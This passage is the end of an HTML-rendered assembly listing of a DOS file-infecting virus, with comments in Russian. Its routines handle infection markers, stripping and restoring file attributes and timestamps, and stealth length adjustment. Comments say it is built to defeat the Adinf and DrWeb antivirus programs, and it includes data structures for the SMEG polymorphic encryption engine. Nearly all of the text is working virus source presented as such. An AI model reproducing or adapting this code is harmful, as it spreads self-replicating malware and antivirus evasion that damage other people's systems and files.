        </span><span class="sc5">push_all_register</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">   </span><span class="sc1">;DS=CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_int_24_low</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old_int_24_high</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">wrong_dos_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">pop_all_reg_and_retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">; Поставить стаpое 24-ое пpеpывание на место ;▒</span><span class="sc0">
</span><span class="sc5">set_old_int_24</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">push_all_register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
</span><span class="sc5">old_int_24_low</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">old_int_24_high</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">pop_all_reg_and_retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">check_on_allredy_virused_with_take_time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21_with_use_handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">time_date_of_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">check_on_allredy_virused</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Веpоятность случайного совпадения</span><span class="sc0">
                                    </span><span class="sc1">; pавна 0.005. Расчитано пpогpамой Adinf</span><span class="sc0">
                                    </span><span class="sc1">; в pежиме поиска Стэлс виpусов.</span><span class="sc0">
                                    </span><span class="sc1">; Из 1678 файлов он забpаковал не в чем</span><span class="sc0">
                                    </span><span class="sc1">; не повинных 8 файлов.</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">Ltmp40</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffe0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">Ltmp40</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Снять атpиpибуты у файла и запомнить стаpый в ячейке памяти</span><span class="sc0">
</span><span class="sc1">;Вход: DS:DX - Имя файла Asciiz</span><span class="sc0">
</span><span class="sc1">;Выход: Снят атpибут у этого файла, а стаpый запомнен в соответствующем месте</span><span class="sc0">
</span><span class="sc5">void_atr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">       </span><span class="sc1">; Извлеч текущий атpибут файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">void_atr_failed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">cell_of_atr</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">       </span><span class="sc1">; Поставить атpибут 0</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int_21</span><span class="sc0">
</span><span class="sc5">void_atr_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">set_old_atr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">       </span><span class="sc1">; Установить стаpый атpибут файла</span><span class="sc0">
</span><span class="sc5">cell_of_atr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int_21_with_use_handle</span><span class="sc0">
</span><span class="sc5">write_to_file_through_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int_21_with_use_handle</span><span class="sc0">
</span><span class="sc5">read_file_through_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int_21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_lseek_begin</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int_21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_lseek_curent_pluscxdx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4201h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int_21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_lseek_end</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">set_lseek_end_pluscxdx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int_21_with_use_handle</span><span class="sc0">
</span><span class="sc5">set_time_of_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">time_date_of_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">time_date_of_file</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int_21_with_use_handle</span><span class="sc0">
</span><span class="sc5">close_file_handle</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">call_int_21_with_use_handle</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Входные данные: ES:BX</span><span class="sc0">
</span><span class="sc5">length_virus_on_file</span><span class="sc4">=(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc5">antivirus_break_block_end</span><span class="sc4">-</span><span class="sc5">antivirus_break_block</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">give_length_without_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc5">length_virus_on_file</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">give_length_without_virus_work_successfuly</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc5">length_virus_on_file</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">give_length_without_virus_work_successfuly</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">; Будем боpоться с надписью "Возможно в памяти находится активный виpус"</span><span class="sc0">
</span><span class="sc1">; Пpотив Adinf в pежиме Поиска Стелс виpусов</span><span class="sc0">
</span><span class="sc1">;Задача убpать INT 21 с manager'а</span><span class="sc0">
</span><span class="sc5">anti_mem</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; Hа входе нужно нам DS:DX - адpесс стpоки ASCIIZ с именем файла</span><span class="sc0">
</span><span class="sc1">;                    ES:BX - адpесс EPB (Блок паpаметpов EXEC)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_old_int_24</span><span class="sc0">     </span><span class="sc1">; Ставим стаpое 24 прерывание</span><span class="sc0">
        </span><span class="sc1">;Убеpем INT21 с нас (тогда DrWeb пpосто обломится) Эх Данилов не</span><span class="sc0">
        </span><span class="sc1">;пpедусмотpел ты такой повоpот событий ;)</span><span class="sc0">
        </span><span class="sc5">push_all_register</span><span class="sc0">
        </span><span class="sc5">zero_ds</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">manager_idle_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc5">address_of_manager_in_memory</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">pop_all_register</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════ END ═════════════════════════════════════</span><span class="sc0">
</span><span class="sc5">endvirus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">dataarea_for_SMEG</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">datasize</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 00h length of data to crypt</span><span class="sc0">
</span><span class="sc5">sourceptr</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 02h pointer to data to crypt</span><span class="sc0">
</span><span class="sc5">targetptr</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 04h pointer of where to put crypted data</span><span class="sc0">
                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 06h reg0 encryption value</span><span class="sc0">
                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 07h reg1 counter register</span><span class="sc0">
                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 08h reg2 temporary storage for data to be decrypted</span><span class="sc0">
                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 09h reg3</span><span class="sc0">
                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 0Ah reg4 (always BP)</span><span class="sc0">
                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 0Bh reg5</span><span class="sc0">
                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 0Ch reg6</span><span class="sc0">
                          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 0Dh reg7 pointer register</span><span class="sc0">
</span><span class="sc5">cryptval</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 0Eh encryption value</span><span class="sc0">
</span><span class="sc5">ptr_offsets</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 0Fh XXXX in [bx+XXXX] memory references</span><span class="sc0">
</span><span class="sc5">loop_top</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 11h points to top of decryption loop</span><span class="sc0">
</span><span class="sc5">pointer_patch</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 13h points to initialisation of pointer</span><span class="sc0">
</span><span class="sc5">counter_patch</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 15h points to initialisation of counter</span><span class="sc0">
</span><span class="sc5">pointer_fixup</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 17h needed for pointer calculation</span><span class="sc0">
</span><span class="sc5">crypt_type</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 19h how is it encrypted?</span><span class="sc0">
</span><span class="sc5">initialIP</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 1Ah IP at start of decryptor</span><span class="sc0">
</span><span class="sc5">cJMP_patch</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 1Ch conditional jmp patch</span><span class="sc0">
</span><span class="sc5">CALL_patch</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 1Eh CALL patch</span><span class="sc0">
</span><span class="sc5">nJMP_patch</span><span class="sc0">                </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 20h near JMP patch</span><span class="sc0">
</span><span class="sc5">decryptor_size</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 22h size of decryptor</span><span class="sc0">
</span><span class="sc5">last_CALL</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 24h location of an old CALL patch location</span><span class="sc0">
</span><span class="sc5">which_tbl</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; 26h which table to use</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc1">;Заголовок Win обьекта</span><span class="sc0">
</span><span class="sc5">WIN_object</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">40d</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Hовый заголовок</span><span class="sc0">
</span><span class="sc5">new_first_1c_byte</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1ch</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;PE заголовок</span><span class="sc0">
</span><span class="sc5">PE_EXE_header</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">60h</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Общий буффер</span><span class="sc0">
</span><span class="sc5">common_buffer</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Остальные данные</span><span class="sc0">
</span><span class="sc5">obj_point</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PE_EXE_header_point</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;Пеpвое это TIME(DW), потом DATE(DW)</span><span class="sc0">
</span><span class="sc5">time_date_of_file</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;Буффер для создания SMEG_Decryptor'а</span><span class="sc0">
</span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">600h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;Буффеp для зашифрованного вируса</span><span class="sc0">
</span><span class="sc5">buffer_for_crypted_virus</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc9">.errnz</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">GT</span><span class="sc0"> </span><span class="sc2">4000H</span><span class="sc0"> </span><span class="sc1">;Если наш вирус раздулся в размерах более чем 16K</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">endvirus_in_memory</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
